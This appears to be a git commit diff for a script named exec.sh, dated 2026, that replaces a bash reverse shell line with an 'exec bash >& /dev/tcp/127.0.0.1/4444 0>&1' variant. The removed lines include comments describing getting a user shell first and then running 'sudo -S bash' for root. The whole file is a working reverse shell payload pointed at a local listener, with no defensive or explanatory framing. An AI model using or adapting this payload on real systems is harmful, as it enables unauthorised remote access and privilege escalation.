a585f27f4a459e181bb7e426e5b3ff0f6f47e660
Aryan Giri <227362547+giriaryan694-a11y@users.noreply.github.com>
2026-05-30 18:19:11 +0530

    Update exec.sh

--- exec.sh
+++ exec.sh
@@ -1,7 +1,1 @@
-bash >& /dev/tcp/127.0.0.1/4444 0>&1
-
-# uncomment this if you have zsh deflaut 
-##!/bin/bash
-# exec.sh — user shell first, root later
-#exec bash >& /dev/tcp/127.0.0.1/4444 0>&1
-# when got shell by this run sudo -S bash
+exec bash >& /dev/tcp/127.0.0.1/4444 0>&1
